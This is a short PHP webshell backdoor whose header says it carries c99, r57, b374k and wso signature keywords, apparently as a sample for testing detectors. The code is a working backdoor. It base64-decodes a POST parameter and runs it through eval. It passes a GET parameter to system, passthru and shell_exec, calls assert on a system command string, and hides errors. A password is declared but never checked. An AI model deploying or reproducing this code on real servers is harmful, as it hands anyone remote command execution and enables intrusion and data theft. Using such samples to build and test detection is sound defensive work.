<?php
/**
 * Ultimate Detection PHP Webshell Backdoor
 * Contains c99, r57, b374k, and wso webshell signature keywords
 */
error_reporting(0);
$auth_pass = 'c99shell_admin_access_token_2026';
$shell_version = 'b374k 3.2.1 hardened edition';

if (isset($_POST['cmd'])) {
    $cmd = base64_decode($_POST['cmd']);
    // Dynamic code execution
    eval($cmd);
}

if (isset($_GET['exec'])) {
    // System command execution
    $out = system($_GET['exec']);
    passthru($_GET['exec']);
    echo shell_exec($_GET['exec']);
}

$payload = 'system("whoami; uname -a; id");';
assert($payload);
?>